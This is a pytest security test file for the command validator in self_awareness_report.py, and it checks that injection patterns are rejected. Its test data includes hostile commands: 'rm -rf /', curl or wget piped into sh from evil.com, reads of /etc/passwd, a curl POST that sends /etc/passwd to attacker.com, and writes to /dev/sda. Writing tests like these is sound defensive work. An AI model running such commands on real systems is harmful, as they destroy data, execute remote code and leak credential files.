#!/usr/bin/env python3
"""Security tests for self_awareness_report.py command injection prevention."""

import pytest
from pathlib import Path
import sys
import os

# Add automation directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "automation"))

from self_awareness_report import _validate_command, _run_command_summary, AutomationResult, COMMAND_TIMEOUT


class TestCommandValidation:
    """Test command validation security checks."""

    def test_validate_safe_command(self):
        """Test that safe commands pass validation."""
        safe_commands = [
            "ls -la",
            "echo 'hello world'",
            "python3 --version",
            "git status",
            "npm install",
            "pytest tests/",
        ]
        
        for cmd in safe_commands:
            assert _validate_command(cmd) is True

    def test_validate_command_with_rm_chaining(self):
        """Test that commands with ; rm are rejected."""
        dangerous_cmd = "ls; rm -rf /"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_with_pipe_to_sh(self):
        """Test that commands piping to sh are rejected."""
        dangerous_cmd = "echo 'malicious' | sh"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_with_command_substitution(self):
        """Test that commands with $() substitution are rejected."""
        dangerous_cmd = "echo $(rm -rf /tmp/test)"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_with_backtick_substitution(self):
        """Test that commands with backtick substitution are rejected."""
        dangerous_cmd = "echo `whoami`"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_with_device_write(self):
        """Test that commands writing to /dev/ are rejected."""
        dangerous_cmd = "echo 'test' > /dev/sda"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_curl_pipe_sh(self):
        """Test that curl | sh pattern is rejected."""
        dangerous_cmd = "curl http://evil.com/script.sh | sh"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_wget_pipe_sh(self):
        """Test that wget | sh pattern is rejected."""
        dangerous_cmd = "wget -O- http://evil.com/script.sh | sh"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)

    def test_validate_command_case_insensitive(self):
        """Test that validation is case-insensitive."""
        dangerous_cmd = "ls; RM -rf /"
        with pytest.raises(ValueError, match="dangerous pattern"):
            _validate_command(dangerous_cmd)


class TestRunCommandSummary:
    """Test command execution with validation."""

    def test_run_command_summary_safe_command(self, tmp_path):
        """Test that safe commands execute successfully."""
        result = _run_command_summary(
            label="Test",
            command="echo 'test output'",
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is not None
        assert isinstance(result, AutomationResult)
        assert result.label == "Test"
        assert result.command == "echo 'test output'"
        assert result.success is True
        assert result.exit_code == 0

    def test_run_command_summary_none_command(self, tmp_path):
        """Test that None command returns None."""
        result = _run_command_summary(
            label="Test",
            command=None,
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is None

    def test_run_command_summary_dangerous_command(self, tmp_path):
        """Test that dangerous commands are rejected."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            _run_command_summary(
                label="Malicious",
                command="ls; rm -rf /",
                cwd=tmp_path,
                max_lines=5
            )

    def test_run_command_summary_failing_command(self, tmp_path):
        """Test that failing commands are captured correctly."""
        result = _run_command_summary(
            label="Fail Test",
            command="ls /nonexistent-directory-12345",
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is not None
        assert result.success is False
        assert result.exit_code != 0

    def test_run_command_summary_captures_output(self, tmp_path):
        """Test that command output is captured."""
        # Create a test file with content
        test_file = tmp_path / "test.txt"
        test_file.write_text("line1\nline2\nline3\n")
        
        result = _run_command_summary(
            label="Echo Test",
            command=f"cat {test_file}",
            cwd=tmp_path,
            max_lines=10
        )
        
        assert result is not None
        assert len(result.output_tail) >= 2
        assert any('line1' in line or 'line2' in line for line in result.output_tail)

    def test_run_command_summary_max_lines_limit(self, tmp_path):
        """Test that max_lines parameter limits output."""
        # Create a test file with many lines
        test_file = tmp_path / "multiline.txt"
        test_file.write_text("\n".join([f"line{i}" for i in range(1, 11)]))
        
        result = _run_command_summary(
            label="Multi-line",
            command=f"cat {test_file}",
            cwd=tmp_path,
            max_lines=3
        )
        
        assert result is not None
        assert len(result.output_tail) <= 3


class TestCommandInjectionPrevention:
    """Test cases specifically for command injection attack patterns."""

    @pytest.mark.parametrize("malicious_cmd", [
        "ls; cat /etc/passwd",
        "echo test && rm -rf /tmp/test",
        "git status || wget http://evil.com/payload | sh",
        "npm test; curl -X POST http://attacker.com --data-binary @/etc/passwd",
        "$(curl http://evil.com/script.sh)",
        "`wget -O- http://evil.com/script.sh`",
        "echo test > /dev/sda",
    ])
    def test_injection_patterns_rejected(self, malicious_cmd, tmp_path):
        """Test that various injection patterns are rejected."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            _run_command_summary(
                label="Attack",
                command=malicious_cmd,
                cwd=tmp_path,
                max_lines=5
            )


class TestTimeoutAndErrorHandling:
    """Test timeout and error handling improvements."""

    @pytest.mark.slow
    def test_run_command_summary_timeout(self, tmp_path):
        """Test that long-running commands timeout correctly.
        
        Note: Uses 'sleep' command to test timeout functionality
        with shell=False execution.
        """
        result = _run_command_summary(
            label="Timeout Test",
            command=f"sleep {COMMAND_TIMEOUT + 5}",  # Sleep longer than the timeout
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is not None
        assert isinstance(result, AutomationResult)
        assert result.success is False
        assert result.exit_code == -1
        assert len(result.output_tail) > 0
        assert "timed out" in result.output_tail[0].lower()

    def test_run_command_summary_path_object_cwd(self, tmp_path):
        """Test that Path objects are accepted for cwd parameter."""
        result = _run_command_summary(
            label="Path Test",
            command="pwd",
            cwd=tmp_path,  # Pass Path object directly
            max_lines=5
        )
        
        assert result is not None
        assert result.success is True
        # The output should contain the path
        assert any(str(tmp_path) in line for line in result.output_tail)


class TestShlexParsing:
    """Test shlex.split() command parsing and error handling."""
    
    def test_command_with_quotes(self, tmp_path):
        """Test that commands with quotes are parsed correctly."""
        result = _run_command_summary(
            label="Quoted Test",
            command="echo 'hello world'",
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is not None
        assert result.success is True
        assert any('hello world' in line for line in result.output_tail)
    
    def test_command_with_arguments(self, tmp_path):
        """Test that commands with multiple arguments work correctly."""
        result = _run_command_summary(
            label="Args Test",
            command="echo one two three",
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is not None
        assert result.success is True
        assert any('one two three' in line for line in result.output_tail)
    
    def test_command_with_unclosed_quote(self, tmp_path):
        """Test that commands with unclosed quotes are rejected."""
        result = _run_command_summary(
            label="Invalid Quote",
            command="echo 'unclosed quote",
            cwd=tmp_path,
            max_lines=5
        )
        
        assert result is not None
        assert result.success is False
        assert result.exit_code == -1
        assert any('Invalid command syntax' in line for line in result.output_tail)
    
    def test_empty_command_string(self, tmp_path):
        """Test that empty command strings after parsing are handled."""
        # This should be caught by the initial if not command check
        # but test the empty cmd_args path as well
        result = _run_command_summary(
            label="Empty",
            command="",
            cwd=tmp_path,
            max_lines=5
        )
        
        # Empty command returns None (handled before shlex.split)
        assert result is None
    
    def test_whitespace_only_command(self, tmp_path):
        """Test that whitespace-only commands are handled correctly."""
        result = _run_command_summary(
            label="Whitespace",
            command="   ",
            cwd=tmp_path,
            max_lines=5
        )
        
        # Whitespace-only command should parse to empty list
        assert result is not None
        assert result.success is False
        assert any('empty or invalid' in line.lower() for line in result.output_tail)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
